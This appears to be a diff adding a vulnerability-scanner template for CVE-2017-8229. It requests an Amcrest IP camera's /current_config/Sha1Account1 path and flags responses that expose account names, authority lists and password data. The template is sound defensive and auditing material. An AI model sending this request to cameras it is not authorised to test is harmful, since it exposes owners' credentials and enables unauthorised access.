@@ -1,0 +1,21 @@
+id: amcrest-current-config-info-leak
+info:
+  name: Amcrest IP Camera Web Sha1Account1 Information Disclosure (CVE-2017-8229)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cve-2017-8229, information-disclosure, amcrest
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/current_config/Sha1Account1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Name\""
+          - "\"AuthorityList\""
+          - "\"Password\""
